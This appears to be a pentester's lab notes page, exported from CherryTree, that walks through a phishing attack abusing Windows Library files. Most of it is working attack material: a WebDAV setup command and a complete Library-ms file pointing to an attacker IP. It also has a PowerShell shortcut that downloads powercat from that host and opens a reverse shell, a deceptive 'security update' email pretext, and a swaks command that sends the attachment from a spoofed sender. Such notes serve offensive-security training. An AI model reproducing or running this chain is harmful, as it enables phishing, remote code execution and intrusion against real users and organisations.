<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Phishing _o_abuse Windows LIbrary files</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>Phishing _o_abuse Windows LIbrary files</h1><br/><p></p><p><h2>Phishing for internal access: windows library  files</h2><ul><li>Context: <ul><li>we don’t have any information about the internal machines or infrastructure =&gt; we&#39;ll chose windows library files as Office might not be installed </li><li>it could seem that we could accomplish this by serving the .lnk file for the second stage with a web server like Apache. The disadvantage is that we would need to provide our web link to the victim (again, perhaps by email). Most spam filters and security technologies analyze the contents of a link for suspicious content or executable file types to download. This means that our links may be filtered before even reaching the victim.</li></ul></li><li>Summary of attack<ul><li>set up a WebDAV server, a Python3 web server, a Netcat listener, and prepare the Windows Library and shortcut files.</li></ul></li></ul></p><p></p><p><ul><li>Practical </p><p></li></ul><div class="codebox"><pre><span style="color:#0088ff;font-weight:400"># 01- kali: start webdav </span><br />wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /opt/webdav<br /><span style="color:#ff9d00;font-weight:700">touch</span> /opt/webdav/test.txt<br /><span style="color:#0088ff;font-weight:400"># 02- connect to WINPREP and inject this library code and ensure ip points to lhost</span><br /><span style="color:#0088ff;font-weight:400">## visual studio code In the menu bar, we&#39;ll click on File &gt; New Text File. We&#39;ll then save the empty file as config.Library-ms</span><br /><br /><span style="color:#ff9d00;font-weight:700">&lt;</span>?xml <span style="color:#7f0044;font-weight:400">version</span>=<span style="color:#3ad900;font-weight:400">&quot;1.0&quot;</span> <span style="color:#7f0044;font-weight:400">encoding</span>=<span style="color:#3ad900;font-weight:400">&quot;UTF-8&quot;</span>?<span style="color:#ff9d00;font-weight:700">&gt;</span><br /><span style="color:#ff9d00;font-weight:700">&lt;</span>libraryDescription <span style="color:#7f0044;font-weight:400">xmlns</span>=<span style="color:#3ad900;font-weight:400">&quot;http://schemas.microsoft.com/windows/2009/library&quot;</span><span style="color:#ff9d00;font-weight:700">&gt;</span><br /><span style="color:#ff9d00;font-weight:700">&lt;</span>name<span style="color:#ff9d00;font-weight:700">&gt;</span>@windows.storage.dll,-<span style="color:#ff9d00;font-weight:700">34582&lt;/</span>name<span style="color:#ff9d00;font-weight:700">&gt;</span><br /><span style="color:#ff9d00;font-weight:700">&lt;</span>version<span style="color:#ff9d00;font-weight:700">&gt;6&lt;/</span>version<span style="color:#ff9d00;font-weight:700">&gt;</span><br /><span style="color:#ff9d00;font-weight:700">&lt;</span>isLibraryPinned<span style="color:#ff9d00;font-weight:700">&gt;</span>true<span style="color:#ff9d00;font-weight:700">&lt;/</span>isLibraryPinned<span style="color:#ff9d00;font-weight:700">&gt;</span><br /><span style="color:#ff9d00;font-weight:700">&lt;</span>iconReference<span style="color:#ff9d00;font-weight:700">&gt;</span>imageres.dll,-<span style="color:#ff9d00;font-weight:700">1003&lt;/</span>iconReference<span style="color:#ff9d00;font-weight:700">&gt;</span><br /><span style="color:#ff9d00;font-weight:700">&lt;</span>templateInfo<span style="color:#ff9d00;font-weight:700">&gt;</span><br /><span style="color:#ff9d00;font-weight:700">&lt;</span>folderType<span style="color:#ff9d00;font-weight:700">&gt;</span>{7d49d726-3c21-4f05-99aa-fdc2c9474656}<span style="color:#ff9d00;font-weight:700">&lt;/</span>folderType<span style="color:#ff9d00;font-weight:700">&gt;</span><br /><span style="color:#ff9d00;font-weight:700">&lt;/</span>templateInfo<span style="color:#ff9d00;font-weight:700">&gt;</span><br /><span style="color:#ff9d00;font-weight:700">&lt;</span>searchConnectorDescriptionList<span style="color:#ff9d00;font-weight:700">&gt;</span><br /><span style="color:#ff9d00;font-weight:700">&lt;</span>searchConnectorDescription<span style="color:#ff9d00;font-weight:700">&gt;</span><br /><span style="color:#ff9d00;font-weight:700">&lt;</span>isDefaultSaveLocation<span style="color:#ff9d00;font-weight:700">&gt;</span>true<span style="color:#ff9d00;font-weight:700">&lt;/</span>isDefaultSaveLocation<span style="color:#ff9d00;font-weight:700">&gt;</span><br /><span style="color:#ff9d00;font-weight:700">&lt;</span>isSupported<span style="color:#ff9d00;font-weight:700">&gt;</span>false<span style="color:#ff9d00;font-weight:700">&lt;/</span>isSupported<span style="color:#ff9d00;font-weight:700">&gt;</span><br /><span style="color:#ff9d00;font-weight:700">&lt;</span>simpleLocation<span style="color:#ff9d00;font-weight:700">&gt;</span><br /><span style="color:#ff9d00;font-weight:700">&lt;</span>url<span style="color:#ff9d00;font-weight:700">&gt;</span>http:<span style="color:#ff9d00;font-weight:700">//</span>192.168.119.<span style="color:#ff9d00;font-weight:700">134&lt;/</span>url<span style="color:#ff9d00;font-weight:700">&gt;</span><br /><span style="color:#ff9d00;font-weight:700">&lt;/</span>simpleLocation<span style="color:#ff9d00;font-weight:700">&gt;</span><br /><span style="color:#ff9d00;font-weight:700">&lt;/</span>searchConnectorDescription<span style="color:#ff9d00;font-weight:700">&gt;</span><br /><span style="color:#ff9d00;font-weight:700">&lt;/</span>searchConnectorDescriptionList<span style="color:#ff9d00;font-weight:700">&gt;</span><br /><span style="color:#ff9d00;font-weight:700">&lt;/</span>libraryDescription<span style="color:#ff9d00;font-weight:700">&gt;</span><br /><br /><br /><span style="color:#0088ff;font-weight:400">## when a user will double click the library file he will open the files that are on our target</span><br /><span style="color:#0088ff;font-weight:400"># 03- save the file and transfer the file to home machine </span><br /><span style="color:#0088ff;font-weight:400">## ps if we double clikc the ile windows will alter the file by adding serialized data =&gt; attack will fails </span><br /><span style="color:#0088ff;font-weight:400"># 04- create shortcut that contains revshell</span><br /><span style="color:#0088ff;font-weight:400">## Next, we’ll create the shortcut file on WINPREP. For this, we’ll right-click on the Desktop and select New &gt; Shortcut</span><br /><br />powershell.exe -c <span style="color:#3ad900;font-weight:400">&quot;IEX(New-Object System.Net.WebClient).DownloadString(&#39;http://192.168.119.134:8000/powercat.ps1&#39;); powercat -c 192.168.119.134 -p 443 -e powershell&quot;</span><br /><br /><br /><span style="color:#0088ff;font-weight:400">## start web server 8000 that servs powercat.ps1 and nc listener 4444 on kali</span><br /><br /><span style="color:#0088ff;font-weight:400"># 05- add shortcut file to webdav </span><br /><br /><span style="color:#0088ff;font-weight:400"># 06- send config-Library via email</span><br /><br /><span style="color:#0088ff;font-weight:400">## body.txt</span><br />Hey!<br />I checked WEBSRV1 and discovered that the previously used staging script still exists<br /><span style="color:#ff9d00;font-weight:700">in</span> the Git logs. I<span style="color:#3ad900;font-weight:400">&#39;ll remove it for security reasons.<br />On an unrelated note, please install the new security features on your workstation.<br />For this, download the attached file, double-click on it, and execute the<br />configuration shortcut within. Thanks!<br />John<br />&#39;</span><br /><span style="color:#0088ff;font-weight:400">## send email </span><br /><span style="color:#ff9d00;font-weight:700">sudo</span> swaks -t daniela@beyond.com -t damian@beyond.com --from damon@relia.com --attach @config.Library-ms --server <span style="color:#7f0044;font-weight:400">$target</span> --body @body.txt --header <span style="color:#3ad900;font-weight:400">&quot;Subject: Staging Script&quot;</span> --suppress-data -ap</pre></div></p></div>
</body>
</html>
